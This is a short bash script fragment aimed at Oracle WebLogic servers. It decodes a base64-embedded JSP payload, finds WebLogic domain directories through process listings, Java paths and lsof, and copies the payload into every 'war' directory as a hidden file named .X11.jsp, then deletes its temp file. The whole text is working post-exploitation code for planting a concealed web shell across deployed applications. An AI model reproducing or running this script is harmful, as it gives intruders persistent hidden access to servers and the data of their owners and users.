tmpFl=`mktemp`
echo $B64Jsp|base64 -d>$tmpFl
sdomain=`ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|sort -u|sed 's/domain.*$//g'`
if [ "${sdomain}" = "" ];
then 
	tmp=`ps -ef|grep java|grep -Eo "(home=[^ ]+)"|sed  's/home=//g'|sed 's/\/wlserver.*$//g'|sort -u|head -n 1`;
	sdomain=`find ${tmp} -type d -name "domains"|grep 'user_projects'`;
fi;
if [ "${sdomain}" = "" ];
then
	tpid=`ps -ef|grep java|grep  'weblogic.Server'|awk '{print $2}'`;
	sdomain=`lsof -p $tpid |grep -Eo '([^ ]+/user_projects/domains/.*domain/)'|sort -u`;
fi;
if [ "${sdomain}" = "" ];
then
	sdomain="/";
fi;
find ${sdomain} -type d -name "war" 2>/dev/null|xargs -I {} cp -f $tmpFl {}/.X11.jsp;
rm -rf $tmpFl;
